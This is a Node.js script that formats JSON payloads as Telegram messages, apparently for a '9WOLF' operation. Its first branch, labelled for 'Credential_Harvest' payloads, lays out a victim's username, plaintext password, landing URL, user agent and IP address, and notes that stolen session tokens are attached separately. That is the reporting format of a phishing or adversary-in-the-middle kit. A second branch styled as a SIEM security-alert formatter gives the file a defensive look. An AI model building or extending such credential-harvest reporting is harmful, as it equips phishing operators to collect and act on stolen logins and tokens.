/**
 * 9WOLF Telegram Log Formatter
 * Formats alert payloads as Telegram-style logs per user template
 */
const fs = require('fs');
const path = require('path');

function pad2(n) { return n < 10 ? '0' + n : n; }

function formatDateTime(dt) {
  const d = new Date(dt);
  const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
  return `${pad2(d.getDate())} ${months[d.getMonth()]}, ${d.getFullYear()}, Time : ${pad2(d.getHours())}:${pad2(d.getMinutes())} ${d.getHours() >= 12 ? 'pm' : 'am'}`;
}

function format9WolfLog(payload) {
  // OORO-style formatting for credential harvests
  if (payload.customType === "Credential_Harvest") {
    return `Note - Message has been updated.\n\n✨ *Session Information* ✨\n\n👤 *Username:* \`${payload.username || ''}\`\n🔑 *Password:* \`${payload.password || ''}\`\n🌐 *Landing URL:* [Link](${payload.landingUrl || ''})\n\n💻 *User Agent:* ${payload.userAgent || ''}\n🌍 *Remote Address:* ${payload.remoteAddress || ''}\n🕒 *Create Time:* ${Math.floor(Date.now() / 1000)}\n\n📦 *Tokens are added in txt file and attached separately in message.*\n`;
  }
  // Fallback to original formatting for other alerts
  const user = payload.user || {};
  const event = payload.event || {};
  const tech = payload.technical_indicators || {};
  let indicators = [];
  if (event.event_type?.toLowerCase().includes('aitm')) indicators.push('`[AiTM Marker Detected]`');
  if (event.event_type?.toLowerCase().includes('infostealer')) indicators.push(`*[Infostealer: ${event.description.match(/RedLine|Raccoon|Vidar|Stealer/i) || 'Unknown'}]*`);
  if (tech.token_replay_detected) indicators.push('`[Token Replay Detected]`');
  if (tech.hidden_inbox_rules_detected) indicators.push('`[Hidden Inbox Rules]`');
  if (tech.legacy_protocol_used) indicators.push('`[Legacy Protocol Used]`');
  if (tech.oauth_app_detected) indicators.push('`[OAuth App Detected]`');
  let severity = (payload.level || event.severity || '').toString().toLowerCase();
  let sevEmoji = severity.includes('critical') ? '🟥' : severity.includes('high') ? '🟧' : severity.includes('medium') ? '🟨' : severity.includes('low') ? '🟩' : '⬜️';
  let timestamp = payload.timestamp || event.timestamp || new Date().toISOString();
  let alertType = event.event_type || payload.alertType || 'Alert';
  let formattedTime = formatDateTime(timestamp);
  let log = [];
  log.push(`*${sevEmoji} ${alertType}*  _${formattedTime}_`);
  log.push('');
  if (user.email) log.push(`👤 *User*: [${user.email}](https://security.microsoft.com/user/${encodeURIComponent(user.email)})`);
  if (user.redacted_password) log.push(`🔑 *PWD*: \\`${user.redacted_password}\\``);
  if (event.mfa_type) log.push(`📲 *MFA*: _${event.mfa_type}_`);
  if (event.geo_location || event.source_ip) log.push(`🗺️ *Location*: ${event.geo_location || ''} | ${event.source_ip || ''}`);
  if (event.status) log.push(`🛡️ *Status*: _${event.status}_`);
  if (event.browser_type) log.push(`🌐 *Browser*: _${event.browser_type}_`);
  if (event.full_user_agent) log.push(`👤 *User Agent*: _${event.full_user_agent}_`);
  if (payload.investigation_url) log.push(`[🔎 Investigate](${payload.investigation_url})`);
  if (indicators.length) log.push(indicators.join(' '));
  log.push('');
  log.push('_This is an automated security alert. For details, see the SIEM/SOAR dashboard._');
  return log.join('\n');
}

if (require.main === module) {
  if (process.argv.length < 3) {
    console.error('Usage: node telegram-formatter-9wolf.js <payload.json>');
    process.exit(1);
  }
  try {
    const filePath = process.argv[2];
    const payload = JSON.parse(fs.readFileSync(filePath, 'utf8'));
    const message = format9WolfLog(payload);
    console.log(message);
  } catch (err) {
    console.error(`Error: ${err.message}`);
    process.exit(1);
  }
}

module.exports = { format9WolfLog };
